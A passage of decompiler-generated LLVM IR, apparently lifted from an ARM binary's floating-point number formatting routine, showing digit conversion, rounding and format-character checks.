  %v0_1c158 = phi i32 [ 0, %dec_label_pc_1c13c ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34740), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34740), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_1c18c = icmp eq i32 %v0_1c158, 0
  br label %dec_label_pc_1c17c

dec_label_pc_1c17c:                               ; preds = %dec_label_pc_1c214.dec_label_pc_1c17c_crit_edge, %bb212
  %v2_1c184 = phi i32 [ add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34740), %bb212 ], [ %v2_1c184.pre, %dec_label_pc_1c214.dec_label_pc_1c17c_crit_edge ]
  %v0_1c180 = phi i32 [ 9, %bb212 ], [ %v0_1c214, %dec_label_pc_1c214.dec_label_pc_1c17c_crit_edge ]
  %v2_1c1c4 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_1c214.dec_label_pc_1c17c_crit_edge ]
  store i32 %v0_1c158, i32* %r2.global-to-local, align 4
  %v1_1c180 = add i32 %v0_1c180, -1
  store i32 %v1_1c180, i32* %sl.global-to-local, align 4
  store i32 %v2_1c184, i32* @lr, align 4
  %v3_1c188 = mul i32 %v1_1c180, 8
  store i32 %v3_1c188, i32* %r3.global-to-local, align 4
  store i1 %v2_1c18c, i1* %cpsr_z.global-to-local, align 1
  %v0_1c190 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1c190, i32* %r0.global-to-local, align 4
  %v0_1c194 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1c194, i32* %r1.global-to-local, align 4
  %v2_1c198 = add i32 %v3_1c188, %v2_1c184
  store i32 %v2_1c198, i32* %ip.global-to-local, align 4
  %v1_1c1d4 = inttoptr i32 %v2_1c198 to i32*
  %v2_1c1d4 = load i32, i32* %v1_1c1d4, align 4
  %v3_1c1d4 = sext i32 %v2_1c1d4 to i64
  %v1_1c1d8 = sext i32 %v0_1c190 to i64
  %v2_1c1d8 = bitcast i64 %v1_1c1d8 to double
  br i1 %v2_1c18c, label %dec_label_pc_1c1d4, label %dec_label_pc_1c1a0

dec_label_pc_1c1a0:                               ; preds = %dec_label_pc_1c17c
  %v8_1c1a4 = bitcast i64 %v3_1c1d4 to double
  %v9_1c1a4 = fmul double %v2_1c1d8, %v8_1c1a4
  %v10_1c1a4 = fptrunc double %v9_1c1a4 to float
  %v11_1c1a4 = bitcast float %v10_1c1a4 to i32
  store i32 %v11_1c1a4, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_1c1a4, i32* %r7.global-to-local, align 4
  store i32 %v0_1c194, i32* %r8.global-to-local, align 4
  %v4_1c1b8 = call i32 @__aeabi_dcmplt(i32 %v11_1c1a4, i32 %v0_1c194, i32 0, i32 1104006501)
  store i32 %v4_1c1b8, i32* %r0.global-to-local, align 4
  %v2_1c1bc = icmp eq i32 %v4_1c1b8, 0
  store i1 %v2_1c1bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c1bc, label %dec_label_pc_1c214, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1c1a0
  %v1_1c1c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_1c1c4 = sub i32 %v2_1c1c4, %v1_1c1c4
  store i32 %v3_1c1c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c20c

dec_label_pc_1c1d4:                               ; preds = %dec_label_pc_1c17c
  store i32 %v0_1c194, i32* @r1, align 4
  %v8_1c1e0 = bitcast i64 %v3_1c1d4 to double
  %v9_1c1e0 = fdiv double %v2_1c1d8, %v8_1c1e0
  %v10_1c1e0 = fptrunc double %v9_1c1e0 to float
  %v11_1c1e0 = bitcast float %v10_1c1e0 to i32
  store i32 %v11_1c1e0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_1c1e0, i32* %r7.global-to-local, align 4
  store i32 %v0_1c194, i32* %r8.global-to-local, align 4
  %v4_1c1f4 = call i32 @__aeabi_dcmpge(i32 %v11_1c1e0, i32 %v0_1c194, i32 0, i32 1100470148)
  store i32 %v4_1c1f4, i32* %r0.global-to-local, align 4
  %v2_1c1f8 = icmp eq i32 %v4_1c1f4, 0
  store i1 %v2_1c1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c1f8, label %dec_label_pc_1c214, label %dec_label_pc_1c200

dec_label_pc_1c200:                               ; preds = %dec_label_pc_1c1d4
  %v1_1c204 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c204 = add i32 %v1_1c204, %v2_1c1c4
  store i32 %v2_1c204, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c20c

dec_label_pc_1c20c:                               ; preds = %.thread10, %dec_label_pc_1c200
  %stack_var_-192.2 = phi i32 [ %v2_1c204, %dec_label_pc_1c200 ], [ %v3_1c1c4, %.thread10 ]
  %v0_1c20c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1c20c, i32* %r5.global-to-local, align 4
  %v0_1c210 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1c210, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c214

dec_label_pc_1c214:                               ; preds = %dec_label_pc_1c1a0, %dec_label_pc_1c1d4, %dec_label_pc_1c20c
  %stack_var_-192.3 = phi i32 [ %v2_1c1c4, %dec_label_pc_1c1d4 ], [ %stack_var_-192.2, %dec_label_pc_1c20c ], [ %v2_1c1c4, %dec_label_pc_1c1a0 ]
  %v0_1c214 = load i32, i32* %sl.global-to-local, align 4
  %v2_1c214 = icmp eq i32 %v0_1c214, 0
  store i1 %v2_1c214, i1* %cpsr_z.global-to-local, align 1
  %v0_1c218 = load i32, i32* %r4.global-to-local, align 4
  %v3_1c218 = sdiv i32 %v0_1c218, 2
  store i32 %v3_1c218, i32* %r4.global-to-local, align 4
  br i1 %v2_1c214, label %dec_label_pc_1c220, label %dec_label_pc_1c214.dec_label_pc_1c17c_crit_edge

dec_label_pc_1c214.dec_label_pc_1c17c_crit_edge:  ; preds = %dec_label_pc_1c214
  %v2_1c184.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_1c17c

dec_label_pc_1c220:                               ; preds = %dec_label_pc_1c214
  %v0_1c220 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1c220, i32* @r0, align 4
  %v0_1c224 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1c224, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_1c230 = call i32 @__aeabi_dcmpge(i32 %v0_1c220, i32 %v0_1c224, i32 0, i32 1104006501)
  store i32 %v6_1c230, i32* %r0.global-to-local, align 4
  %v2_1c234 = icmp eq i32 %v6_1c230, 0
  store i1 %v2_1c234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c234, label %dec_label_pc_1c264, label %dec_label_pc_1c23c

dec_label_pc_1c23c:                               ; preds = %dec_label_pc_1c220
  %v0_1c23c = load i32, i32* %r5.global-to-local, align 4
  %v1_1c23c = sext i32 %v0_1c23c to i64
  %v2_1c23c = bitcast i64 %v1_1c23c to double
  %v0_1c240 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1c240, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_1c24c = fdiv double %v2_1c23c, 0.000000e+00
  %v10_1c24c = fptrunc double %v9_1c24c to float
  %v11_1c24c = bitcast float %v10_1c24c to i32
  store i32 %v11_1c24c, i32* %r0.global-to-local, align 4
  store i32 %v11_1c24c, i32* %r5.global-to-local, align 4
  %v1_1c25c = add i32 %stack_var_-192.3, 1
  store i32 %v1_1c25c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c264

dec_label_pc_1c264:                               ; preds = %dec_label_pc_1c23c, %bb208, %dec_label_pc_1c220, %dec_label_pc_1c084
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_1c220 ], [ -1, %dec_label_pc_1c084 ], [ -1, %bb208 ], [ %v1_1c25c, %dec_label_pc_1c23c ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1c268 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_1c268, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1c26c

dec_label_pc_1c26c:                               ; preds = %dec_label_pc_1c2e4, %dec_label_pc_1c264
  %v0_1c26c = load i32, i32* %r6.global-to-local, align 4
  %v0_1c270 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c274 = sext i32 %v0_1c270 to i64
  %v2_1c274 = bitcast i64 %v1_1c274 to double
  %v3_1c274 = fptoui double %v2_1c274 to i32
  store i32 %v3_1c274, i32* %r8.global-to-local, align 4
  store i32 %v3_1c274, i32* %r2.global-to-local, align 4
  store i32 %v0_1c26c, i32* %r3.global-to-local, align 4
  store i32 %v0_1c270, i32* @r0, align 4
  store i32 %v0_1c26c, i32* %r1.global-to-local, align 4
  %v6_1c290 = call i32 @__aeabi_dsub(i32 %v0_1c270, i32 %v0_1c26c, i32 %v3_1c274, i32 %v0_1c26c)
  %v7_1c290 = sext i32 %v6_1c290 to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_1c29c = bitcast i64 %v7_1c290 to double
  %v9_1c29c = fmul double %v3_1c29c, 0.000000e+00
  %v10_1c29c = fptrunc double %v9_1c29c to float
  %v11_1c29c = bitcast float %v10_1c29c to i32
  store i32 %v11_1c29c, i32* %r0.global-to-local, align 4
  %v0_1c2a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_1c2a0 = add i32 %v0_1c2a0, 9
  store i32 %v1_1c2a0, i32* %sl.global-to-local, align 4
  store i32 %v11_1c29c, i32* %r5.global-to-local, align 4
  store i32 %v0_1c26c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1c2b0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c2b0

dec_label_pc_1c2b0:                               ; preds = %dec_label_pc_1c2b0.dec_label_pc_1c2b0_crit_edge, %dec_label_pc_1c26c
  %v1_1c2c4 = phi i32 [ %v1_1c2c4.pre, %dec_label_pc_1c2b0.dec_label_pc_1c2b0_crit_edge ], [ %v1_1c2a0, %dec_label_pc_1c26c ]
  %v0_1c2bc = phi i32 [ %v0_1c2d8, %dec_label_pc_1c2b0.dec_label_pc_1c2b0_crit_edge ], [ 0, %dec_label_pc_1c26c ]
  %v0_1c2c8 = phi i32 [ %v2_1c2d4, %dec_label_pc_1c2b0.dec_label_pc_1c2b0_crit_edge ], [ %v0_1c2b0.pre, %dec_label_pc_1c26c ]
  %v3_1c2b8 = urem i32 %v0_1c2c8, 10
  %v1_1c2bc = add i32 %v0_1c2bc, 1
  store i32 %v1_1c2bc, i32* %r7.global-to-local, align 4
  %v1_1c2c0 = or i32 %v3_1c2b8, 48
  store i32 %v1_1c2c0, i32* %r2.global-to-local, align 4
  %v2_1c2c4 = sub i32 %v1_1c2c4, %v1_1c2bc
  store i32 %v2_1c2c4, i32* %r3.global-to-local, align 4
  store i32 %v0_1c2c8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1c2d0 = trunc i32 %v1_1c2c0 to i8
  %v3_1c2d0 = inttoptr i32 %v2_1c2c4 to i8*
  store i8 %v1_1c2d0, i8* %v3_1c2d0, align 1
  %v0_1c2d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c2d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c2d4 = udiv i32 %v0_1c2d4, %v1_1c2d4
  store i32 %v2_1c2d4, i32* %r0.global-to-local, align 4
  %v0_1c2d8 = load i32, i32* %r7.global-to-local, align 4
  %v7_1c2d8 = icmp eq i32 %v0_1c2d8, 8
  store i1 %v7_1c2d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1c2d4, i32* %r8.global-to-local, align 4
  %v7_1c2e0 = icmp slt i32 %v0_1c2d8, 9
  br i1 %v7_1c2e0, label %dec_label_pc_1c2b0.dec_label_pc_1c2b0_crit_edge, label %dec_label_pc_1c2e4

dec_label_pc_1c2b0.dec_label_pc_1c2b0_crit_edge:  ; preds = %dec_label_pc_1c2b0
  %v1_1c2c4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1c2b0

dec_label_pc_1c2e4:                               ; preds = %dec_label_pc_1c2b0
  %v0_1c2e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c2e4 = add i32 %v0_1c2e4, 1
  store i32 %v1_1c2e4, i32* %r4.global-to-local, align 4
  %v7_1c2e8 = icmp eq i32 %v0_1c2e4, 0
  store i1 %v7_1c2e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c2e8, label %dec_label_pc_1c26c, label %dec_label_pc_1c2f0

dec_label_pc_1c2f0:                               ; preds = %dec_label_pc_1c2e4
  %v0_1c2f0 = load i32, i32* %sb.global-to-local, align 4
  %v7_1c2f0 = icmp eq i32 %v0_1c2f0, 96
  store i1 %v7_1c2f0, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_1c2f0, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_1c2f0
  %v5_1c300 = add i32 %v0_1c2f0, 32
  store i32 %v5_1c300, i32* %r3.global-to-local, align 4
  %v5_1c304 = urem i32 %v5_1c300, 256
  store i32 %v5_1c304, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_1c2f0
  %v4_1c2fc.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_1c2fc.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_1c2fc126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_1c324 = phi i32 [ %v0_1c2f0, %thread-pre-split ], [ %v5_1c304, %bb213 ]
  %v7_1c308 = icmp eq i32 %v0_1c324, 103
  %. = zext i1 %v7_1c308 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_1c314 = load i32, i32* %fp.global-to-local, align 4
  %v2_1c314 = icmp eq i32 %v0_1c314, 0
  store i1 %v2_1c314, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_1c314, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_1c31c = icmp eq i1 %v7_1c308, false
  store i1 %v2_1c31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c31c, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_1c320 = add i32 %v0_1c314, -1
  store i32 %v2_1c320, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_1c334 = phi i32 [ %v0_1c314, %.thread16 ], [ %v0_1c314, %bb218 ], [ %v2_1c320, %bb219 ]
  %v7_1c324 = icmp eq i32 %v0_1c324, 102
  store i1 %v7_1c324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c324, label %dec_label_pc_1c330, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_1c334, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1c358

dec_label_pc_1c330:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_1c334 = add i32 %v0_1c334, %stack_var_-192.4
  store i32 %v2_1c334, i32* %ip.global-to-local, align 4
  %v8_1c338 = icmp eq i32 %v2_1c334, -1
  store i1 %v8_1c338, i1* %cpsr_z.global-to-local, align 1
  %v6_1c33c = icmp slt i32 %v2_1c334, -1
  br i1 %v6_1c33c, label %dec_label_pc_1c340, label %dec_label_pc_1c358

dec_label_pc_1c340:                               ; preds = %dec_label_pc_1c330
  %v2_1c340 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1c340, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_1c34c = bitcast i32* %stack_var_-83 to i8*
  %v4_1c34c = call i32 @__GI_memset(i8* %v3_1c34c, i32 48, i32 17)
  store i32 %v4_1c34c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1c358

dec_label_pc_1c358:                               ; preds = %bb221, %dec_label_pc_1c330, %dec_label_pc_1c340
  %v1_1c39c92 = phi i32 [ %v4_1c34c, %dec_label_pc_1c340 ], [ %v2_1c2d4, %dec_label_pc_1c330 ], [ %v2_1c2d4, %bb221 ]
  %v1_1c380 = phi i32 [ -1, %dec_label_pc_1c340 ], [ %v2_1c334, %dec_label_pc_1c330 ], [ %v0_1c334, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_1c340 ], [ %stack_var_-192.4, %dec_label_pc_1c330 ], [ %stack_var_-192.4, %bb221 ]
  %v1_1c35c = add i32 %v1_1c380, -16
  %v3_1c35c = sub i32 15, %v1_1c380
  %v4_1c35c = and i32 %v3_1c35c, %v1_1c380
  %v5_1c35c = icmp slt i32 %v4_1c35c, 0
  %v6_1c35c = icmp slt i32 %v1_1c35c, 0
  %v7_1c35c = icmp eq i32 %v1_1c380, 16
  store i1 %v7_1c35c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_1c368 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1c368, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_1c370 = xor i1 %v6_1c35c, %v5_1c35c
  %v4_1c370 = or i1 %v7_1c35c, %v3_1c370
  br i1 %v4_1c370, label %dec_label_pc_1c37c, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_1c358
  %v7_1c370137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_1c370137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_1c37c:                               ; preds = %dec_label_pc_1c358
  %v2_1c37c = ptrtoint i32* %stack_var_-82 to i32
  %v2_1c380 = add i32 %v1_1c380, %v2_1c37c
  store i32 %v2_1c380, i32* %r3.global-to-local, align 4
  %v1_1c384 = add i32 %v2_1c380, 2
  %v2_1c384 = inttoptr i32 %v1_1c384 to i8*
  %v3_1c384 = load i8, i8* %v2_1c384, align 1
  %v4_1c384 = zext i8 %v3_1c384 to i32
  store i32 %v4_1c384, i32* %r2.global-to-local, align 4
  store i32 %v1_1c384, i32* %r1.global-to-local, align 4
  %v2_1c38c = icmp ugt i8 %v3_1c384, 51
  %v7_1c38c = icmp eq i8 %v3_1c384, 52
  store i1 %v7_1c38c, i1* %cpsr_z.global-to-local, align 1
  %v2_1c390 = xor i1 %v2_1c38c, true
  %v3_1c390 = or i1 %v7_1c38c, %v2_1c390
  br i1 %v3_1c390, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_1c37c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_1c37c, %bb222
  %v1_1c39c90 = phi i32 [ %v1_1c39c92, %dec_label_pc_1c37c ], [ 0, %bb222 ]
  %v2_1c394 = xor i1 %v7_1c38c, true
  %v3_1c394 = and i1 %v2_1c38c, %v2_1c394
  br i1 %v3_1c394, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_1c398 = phi i32 [ %v0_1c398.pre, %._crit_edge87 ], [ %v7_1c370137141, %.thread140 ], [ %v1_1c384, %bb223 ], [ %v1_1c384, %bb224 ]
  %v1_1c39c = phi i32 [ %v1_1c39c.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_1c39c90, %bb223 ], [ 1, %bb224 ]
  %v1_1c398 = add i32 %v0_1c398, -1
  %v2_1c398 = inttoptr i32 %v1_1c398 to i8*
  %v3_1c398 = load i8, i8* %v2_1c398, align 1
  %v4_1c398 = zext i8 %v3_1c398 to i32
  store i32 %v1_1c398, i32* %r1.global-to-local, align 4
  %v2_1c39c = add i32 %v4_1c398, %v1_1c39c
  %v1_1c3a0 = urem i32 %v2_1c39c, 256
  store i32 %v1_1c3a0, i32* %r3.global-to-local, align 4
  %v2_1c3a4 = icmp ugt i32 %v1_1c3a0, 56
  %v7_1c3a4 = icmp eq i32 %v1_1c3a0, 57
  store i1 %v7_1c3a4, i1* %cpsr_z.global-to-local, align 1
  %v2_1c3a8 = xor i1 %v2_1c3a4, true
  %v3_1c3a8 = or i1 %v7_1c3a4, %v2_1c3a8
  br i1 %v3_1c3a8, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_1c3ac = xor i1 %v7_1c3a4, true
  %v3_1c3ac = and i1 %v2_1c3a4, %v2_1c3ac
  br i1 %v3_1c3ac, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_1c3b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_1c3b4 = phi i32 [ %v1_1c3b4.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_1c3b0 = icmp eq i32 %v1_1c3a0, 48
  store i1 %v7_1c3b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c3b0, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_1c3b4 = or i32 %v1_1c3b4, 1
  store i32 %v2_1c3b4, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_1c3b8 = phi i32 [ 1, %bb229 ], [ %v1_1c3b4, %bb228 ]
  %v2_1c3b8 = icmp eq i32 %v0_1c3b8, 0
  store i1 %v2_1c3b8, i1* %cpsr_z.global-to-local, align 1
  %v1_1c3bc = trunc i32 %v2_1c39c to i8
  store i8 %v1_1c3bc, i8* %v2_1c398, align 1
  %v0_1c3c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1c3c0, label %dec_label_pc_1c3c4, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_1c39c.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_1c398.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_1c3c4:                               ; preds = %._crit_edge93
  store i32 %v2_1c368, i32* %r2.global-to-local, align 4
  %v2_1c3c8 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_1c3c8, i32* %r3.global-to-local, align 4
  %v0_1c3cc = load i32, i32* %r1.global-to-local, align 4
  %v3_1c3cc = icmp uge i32 %v0_1c3cc, %v2_1c3c8
  %v9_1c3cc = icmp eq i32 %v0_1c3cc, %v2_1c3c8
  store i1 %v9_1c3cc, i1* %cpsr_z.global-to-local, align 1
  %v2_1c3d0 = xor i1 %v3_1c3cc, true
  %v3_1c3d0 = or i1 %v9_1c3cc, %v2_1c3d0
  br i1 %v3_1c3d0, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_1c3c4
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_1c3c8, i32* %r2.global-to-local, align 4
  store i32 %v2_1c3c8, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_1c3c4, %bb230
  %v2_1c3f0 = phi i32 [ %v2_1c3c8, %bb230 ], [ %v0_1c3cc, %dec_label_pc_1c3c4 ]
  %v4_1c3e4144 = phi i32 [ %v2_1c3c8, %bb230 ], [ %v2_1c368, %dec_label_pc_1c3c4 ]
  %v2_1c3dc = xor i1 %v9_1c3cc, true
  %v3_1c3dc = and i1 %v3_1c3cc, %v2_1c3dc
  br i1 %v3_1c3dc, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_1c3d0, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_1c3e0 = load i32, i32* @lr, align 4
  %v5_1c3e0 = add i32 %v4_1c3e0, 1
  store i32 %v5_1c3e0, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_1c3dc, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_1c3e4 = add i32 %v4_1c3e4144, 2
  store i32 %v5_1c3e4, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1c3ec = load i32, i32* %sb.global-to-local, align 4
  %v7_1c3ec = icmp eq i32 %v0_1c3ec, 103
  store i1 %v7_1c3ec, i1* %cpsr_z.global-to-local, align 1
  %v3_1c3f0 = add i32 %v2_1c3f0, 1
  %v4_1c3f0 = inttoptr i32 %v3_1c3f0 to i8*
  store i8 0, i8* %v4_1c3f0, align 1
  %v0_1c3f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c3f4 = add i32 %v0_1c3f4, 1
  store i32 %v1_1c3f4, i32* %lr.global-to-local, align 4
  %v0_1c3f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1c3f8, label %dec_label_pc_1c3fc, label %dec_label_pc_1c424

dec_label_pc_1c3fc:                               ; preds = %bb236
  %v0_1c3fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1c3fc = load i32, i32* %ip.global-to-local, align 4
  %v2_1c3fc = sub i32 %v0_1c3fc, %v1_1c3fc
  %v4_1c3fc = xor i32 %v1_1c3fc, %v0_1c3fc
  %v5_1c3fc = xor i32 %v2_1c3fc, %v0_1c3fc
  %v6_1c3fc = and i32 %v5_1c3fc, %v4_1c3fc
  %v7_1c3fc = icmp slt i32 %v6_1c3fc, 0
  %v8_1c3fc = icmp slt i32 %v2_1c3fc, 0
  %v9_1c3fc = icmp eq i32 %v0_1c3fc, %v1_1c3fc
  %v3_1c400 = xor i1 %v8_1c3fc, %v7_1c3fc
  %v4_1c400 = or i1 %v9_1c3fc, %v3_1c400
  %.258 = zext i1 %v4_1c400 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_1c408 = add i32 %v0_1c3fc, 4
  %v3_1c408 = sub i32 0, %v0_1c3fc
  %v4_1c408 = and i32 %v1_1c408, %v3_1c408
  %v5_1c408 = icmp slt i32 %v4_1c408, 0
  %v6_1c408 = icmp slt i32 %v1_1c408, 0
  %v7_1c408 = icmp eq i32 %v1_1c408, 0
  store i1 %v7_1c408, i1* %cpsr_z.global-to-local, align 1
  %v2_1c40c = xor i1 %v6_1c408, %v5_1c408
  br i1 %v2_1c40c, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_1c3fc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1c740

bb239:                                            ; preds = %dec_label_pc_1c3fc
  %v2_1c410 = icmp eq i1 %v4_1c400, false
  store i1 %v2_1c410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c410, label %dec_label_pc_1c740, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_1c414 = sub i32 %v1_1c3fc, %v0_1c3fc
  store i32 %v3_1c414, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c430

dec_label_pc_1c424:                               ; preds = %bb236
  %v0_1c424 = load i32, i32* %sb.global-to-local, align 4
  %v7_1c424 = icmp eq i32 %v0_1c424, 102
  store i1 %v7_1c424, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1c424, i32* %r8.global-to-local, align 4
  br i1 %v7_1c424, label %dec_label_pc_1c424.dec_label_pc_1c430_crit_edge, label %dec_label_pc_1c440

dec_label_pc_1c424.dec_label_pc_1c430_crit_edge:  ; preds = %dec_label_pc_1c424
  %v0_1c430.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c430

dec_label_pc_1c430:                               ; preds = %.thread24, %dec_label_pc_1c424.dec_label_pc_1c430_crit_edge
  %v0_1c430 = phi i32 [ %v0_1c430.pre, %dec_label_pc_1c424.dec_label_pc_1c430_crit_edge ], [ %v0_1c3fc, %.thread24 ]
  %v1_1c430 = icmp slt i32 %v0_1c430, 0
  %v2_1c430 = icmp eq i32 %v0_1c430, 0
  store i1 %v2_1c430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1c430, label %bb240, label %dec_label_pc_1c440

bb240:                                            ; preds = %dec_label_pc_1c430
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_1c438 = load i32, i32* %r2.global-to-local, align 4
